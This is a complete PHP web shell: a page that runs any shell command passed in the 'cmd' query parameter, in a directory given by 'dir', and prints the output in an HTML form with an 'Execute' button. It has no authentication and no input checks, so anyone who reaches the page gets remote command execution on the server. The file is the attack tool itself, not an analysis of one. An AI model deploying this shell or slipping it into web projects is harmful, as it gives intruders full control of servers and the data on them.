<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$cmd = 'ls -lah';
if (!empty($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
}

$dir = getcwd();
if (!empty($_GET['dir'])) {
    $dir = $_GET['dir'];
}

$out = '';
if (chdir($dir)) {
    $out = `$cmd 2>&1`;
}
?>

<form>
    <input name="dir" type="text" value="<?php echo $dir; ?>">
    <br>
    <input name="cmd" type="text" value="<?php echo $cmd; ?>" autofocus>
    <br>
    <button type="submit">Execute</button>
</form>

<pre><?php echo $out; ?></pre>

<style>
input {
    width: 100%;
}
</style>
